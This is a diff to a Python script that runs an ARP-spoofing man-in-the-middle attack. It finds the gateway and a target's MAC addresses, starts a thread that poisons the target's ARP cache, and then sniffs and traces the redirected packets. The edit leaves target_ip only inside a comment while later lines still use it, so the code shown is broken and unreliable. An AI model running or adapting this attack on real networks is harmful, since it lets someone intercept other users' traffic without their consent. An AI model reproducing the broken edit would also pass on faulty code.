@@ -42,7 +42,8 @@ def main():
     # get the target ip and mac 
     pkg_for_arp = channel.top() # this pkg is from gateway of finding the target mac
     # !!input the target ip and mac, forexample: tfp...
-    # target_ip, target_mac = #!!input the target ip and mac
+    # target_ip = #!!input the target ip and mac
+    target_mac= xTrace.Sniffer.get_mac_by_ip(target_ip)
     gateway_ip, gateway_mac = xTrace.Sniffer.get_five_tuple(pkg_for_arp)[1], xTrace.Sniffer.get_mac(pkg_for_arp)
     arp_spoof = ArpSpoof.ArpSpoof(target_ip,target_mac,gateway_ip,gateway_mac)
     thread_arp_spoof = threading.Thread(target=arp_spoof.spoof)
@@ -54,7 +55,7 @@ def main():
             continue
         pkg = channel.top()
         xTrace.Sniffer.tracert(pkg)
-        
+
 
     
 
